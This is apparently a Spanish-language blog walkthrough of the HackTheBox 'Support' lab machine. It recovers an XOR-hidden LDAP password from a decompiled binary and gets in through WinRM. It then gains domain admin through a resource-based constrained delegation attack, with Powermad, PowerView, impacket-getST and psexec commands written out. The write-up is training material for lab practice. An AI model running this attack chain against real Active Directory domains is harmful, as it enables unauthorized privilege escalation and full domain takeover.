---
title: "Support - HTB | by ils00"
author: ils00
categories: [HackTheBox, Fácil]
tags: [web, eJPT, ActiveDirectory, ldap, winrm, smb, scripting, bloodhound]
render_with_liquid: false
media_subpath: /img_p/support_htb
image:
  path: logo.png
---


Esta es una manera de resolver la máquina **Support** de **HackTheBox** con categoría **Fácil** en la plataforma.

![](maquina.png)

## Conocimientos Previos:

- Enumeración con NMAP
- Conocimiento básico de protocolos:
	- smb
	- ldap
- Conocimiento básico WinRM
- BloodHound
- Conocimiento de Directorio Activo


Después de saber todo esto, vamos a comenzar!!!

**** ESPERAR 5 MINS ANTES DE EMPEZAR CON LOS ESCANEOS ****

Creamos una jerarquía de directorios para poder tenerlo todo organizado.

![](jerarquia.png)

## Escaneo de Puertos:

Primeramente, lanzamos una traza ICMP hacia la máquina víctima para ver si nos responde:

![](ping.png)

Como podemos ver en el TTL nos muestra que es una máquina Windows, debido a que tiene un TTL similar a **128**.

Vamos a lanzar el primer escaneo de nmap que nos dará una vista mas o menos a que nos estaremos enfrentando.

`nmap -p- --open -sS -Pn -n -v  --min-rate 5000 IP_VICTUMA -oN Allports` 

![](puertos.png)

Vemos que tenemos varios puertos abiertos y por lo que parece que nos estamos enfrentando ante un directorio activo.

Vamos a realizar un escaneo más exhaustivo a los puertos más bajitos.

`nmap -p53,88,135,139,389,445,464,593,3268,3269,5985 -sCV IP_VICTIMA -oN Targeted`

```console
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-18 08:19:31Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
189/tcp filtered qft  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
3269/tcp open tcpwrapped  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:  
| smb2-time:  
| date: 2025-06-18T08:19:34  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required
```

## Escaneo de Protocolos:

Vamos a escanear el protocolo **SMB**, mediante el comando:

`smbclient -L //IP -N`

![](smb.png)

Encontramos 6 recursos, después de analizar el protocolo con usuario anónimo.

![](smb1.png)

Aquí podemos ver que tenemos un recurso compartido que no es predeterminado de Windows.

Ya que nos podemos meter como anónimo en restos recursos vamos a entrar.

Veamos que contiene “**support-tools**”

![](smb2.png)

![](smb3.png)

Podemos ver todos estos archivos dentro. Hay uno que no es una herramienta convencional de Windows parece:

![](smb4.png)

Haciendo unas simples búsquedas en Google podemos ver que todas están relacionadas con el sistema operativo, menos “**UserInfo.exe**”.

Me lo traigo a mi máquina para analizarlo.

![](smb5.png)

Cuando lo extraigo sale eso:

![](ficheros.png)

Voy a analizar el archivo principal que será el **UserInfo.exe,** usaremos la herramienta ilspycmd.

`ilspycmd -o decompiled_source C:\RUTA\UserInfo.exe `

En la carpeta que hemos creado en mi caso “**decompiled_source**”

Viendo el contenido decompilado he sacado el trozo del script que me parece que es el impórtate :

```console
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()  
{  
 byte[] array = Convert.FromBase64String(enc_password);  
 byte[] array2 = array;  
 for (int i = 0; i < array.Length; i++)  
 {  
 array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ 0xDF);  
 }  
 return Encoding.Default.GetString(array2);
```

Hay una contraseña cifrada llamada **enc_password,** que es una cadena en Base64.

Hay una clave “**key**” que es la palabra “**armando**” convertida en bytes.  
Cuando llamas a getPassword(), el programa:

Convierte **enc_password** de Base64 a bytes (para poder trabajar con ellos)

Luego descifra esos bytes aplicando un proceso:

Luego descifra esos bytes aplicado un proceso:

- Para cada byte en el array descifra usando XOR con_  
  El byte correspondiente de la clave (key[i % key.Length]) — esto repetirá la clave si es más corta que el texto.  
  Y otro valor fijo 0xDF  
  Finalmente convierte esos bytes descifrados en texto (la contraseña real) y la devuelve.

En resumen:

- La contraseña está “oculta” en enc_password usando un cifrado simple XOR con la clave “**armando**” y el valor **0xDF**
- **getPassword()** descifra y devuelve la contraseña original en texto claro.
- Esa contraseña luego se usa para conectar al servidor LDAP con el usuario **support\ldap**

Lo haremos mas sencillo, mediante CiberChef y la siguiente combinación podremos sacar la contraseña en texto claro:

Paso 1 → Codifica en Base64

Paso 2 → XOR doble con:

- Una clave “armando”
- Y con el byte 0xDF

![](cyberchef.png)

Ahora que tenemos la contraseña vamos a ingresar al servicio:

![](ldap.png)

` ldapsearch -x -H ldap://10.10.11.174 -D "support\\ldap" -w 'X' -b "dc=support,dc=htb" > ldap.txt`

Una vez sacado toda la información y haberla metido dentro del fichero **ldap.txt,** analizemos el fichero en busca de usuarios.

Tras buscar con nano por diferentes usuarios:

![](ldap_user.png)

Busque el usuario suppor con la siguiente búsqueda: # support, porque es como aparece, hashtag espacio usuario.

![](user.png)

 Pues así lo hice y di con el usuario support y en un apartado llamado **info** al parecer hay una contraseña.

![](ldap_user_support.png)

## Explotación I:

Pensando un poco y volviendo un poco hacia atrás, en el escaneo de nmap podemos ver esto:

![](winrm.png)

Está abierto el puerto **5985** que es el puerto por defecto de WinRM.

Utilizaremos la herramienta **evil-winrm:**

`evil-winrm -i 10.10.11.174 -u support -p PASS`

Estamos dentro, vamos a ver que podemos encontrar.

![](user_flag.png)

La bandera de user.

Vamos a empezar la escalada a Administrador:

## Escalada I:

Primeramente, miraremos qué privilegio tenemos.

![](user_supp_perm.png)

Vemos que tenemos permisos en un grupo local, vamos a investigar eso:

** A PARTIR DE AQUÍ CAMBIA LA MAQUINA A UNA KALI ** 

Lo que vamos a realizar es un escaneo del dominio ya que tenemos un usuario del mismo, lo haremos con la herramienta **bloodhound-python**.

`bloodhound-python -c All -u support -p 'PASS' -ns IP -d support.htb`

 Una vez ejecutemos esto, lo que haremos será los json que nos ha creado guardarlos porque la siguiente herramienta nos lo pedirá.

Primero, ejecutamos la herramienta **neo4j** con el comando:

neo4j console

Una vez ejecutado, vamos a un navegador y buscamos “http://localhost:7474”, cambiamos la contraseña a una que queramos y posteriormente, ejecutamos el comando de **bloodhound**.

![](bloodhound.png)

Para una explicación más exhaustiva o si hay alguna duda visita: [BloodHoubd - Kali](https://www.kali.org/tools/bloodhound/)

Entramos a la ruta: `http://127.0.0.1:8080/ui/login`

![](login_blood.png)

Y estamos dentro:

![](dentro_blood.png)

Una vez dentro, vamos a revistar lo que vimos anteriormente lo de “Shared Support Accounts”.

Le damos a este icono.

![](bloodhound_2.png)

Consultamos y…

![](DC1.png)

Podemos ver que el usuario support es miembro del grupo “S**hared Support Accounts**” que tiene privilegios “**Generic All” s**obre el **DC**.

![](DC2.png)

Vamos a ver cómo podemos abusar de esto dándole a “GenericAll”. Le damos click aquí y veremos los pasos para la posible explotación.

![](GenericAll.png)

El ataque que realizaremos será un “Resource-Based Constrained Delegation Attack”.

Este ataque se basa en abusar de una configuración en Active Directory donde un servicio tiene permiso para actuar en nombre de un usuario anto otro servicio.

Para realizar el ataque he decidido finalmente usar **HackTricks** porque lo explica un poco mejor para saber que estoy haciendo en todo momento.

[Resource-based Constrained Delegation - HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)

Voy a seguir los pasos

## Explotación de la Escalada:

Como dicen en los pasos vamos a crear un objeto dentro de mi equipo con **powermad**.

Descargamos el fichero:

![](PowerMad.png)

[PowwewrMad - Git](https://github.com/Kevin-Robertson/Powermad)

![](upload.png)

Una vez descargado lo subimos a la maquina de víctima:

![](upload_2.png)

Importamos el módulo:

![](import.png)

Ahora siguiendo los pasos nos dice que creemos el objeto dentro de la máquina, con este comando:

> *** USER = Usuario a elegir PASS = Password a elegir ***



`New-MachineAccount -MachineAccount USER -Password $(ConvertTo-SecureString 'PASS' -AsPlainText -Force) -Verbose`

Ahora descargaremos la siguiente parte de la explotación **powerview:**

[PowerView.ps1 - Git](https://github.com/lucky-luk3/ActiveDirectory/blob/master/PowerView.ps1)

Y como hemos hecho anteriormente la subiremos a la máquina víctima.

![](upload_3.png)

Una vez subido,importamos el modulo:

`Import-Module PowerView.ps1`

Y con el comando “Get-DomainComputer USER” podremos ver todo los datos del usuario.

![](user_hacker.png)

Anbtes de seguir nos copiamos el SID del usuario que lo necesitaremos para las siguientes instrucciones:

![](sid.png)

Siguiendo con el plan de explotación de HackTricks nos dice que hagamos esta serie de comandos, que parece que estamos almacenando variables.

`$ComputerSid = Get-DomainComputer USER -Properties objectsid | Select -Expand objectsid`

`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"`

`$SDBytes = New-Object byte[] ($SD.BinaryLength)`

`$SD.GetBinaryForm($SDBytes,`

`Get-DomainComputer NOMBRE MAQUINA | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`

Importante cambiar el “**NOMBRE DE LA MÁQUINA**” en este caso se llama la máquina DC.

Ahora que hemos lanzado todo esto vamos a ver si está todo correcto.

`Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'`

Para finalizar, utilizaremos **impacket**.

`impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip IP support.htb/USER$:PASS`

![](tgs.png)

Ahora ya hemos obtenido un **TGS** (Ticket de Servicio) que nos va a permitir suplantar al usuario Administrador gracias a la delegación **S4U** (Service for User).

Exportamos el sitio de almacenaje del ticket dentro de esta variable y ahora mediante **psexec** vamos a entrar como administradores de dominio.

![](export.png)

impacket-psexec  -k -no-pass -dc-ip IP SUPPORT.HTB/Administrator@dc.support.htb

![](entrando.png)

Estamos dentro de la máquina.

## Conclusión:

Esta es una máquina de nivel fácil pero a mi me ha costado algo más de trabajo debido a que toca Active Directory y es algo de lo cual me estoy empezado a especializar y me toca investigar bastante para poder sacar las cosas. Por lo demás la máquina una máquina divertida. He tardado en resolverla **varios días** con algo de ayuda.

Un saludo, GOOD HACKING!!!!

> XIII
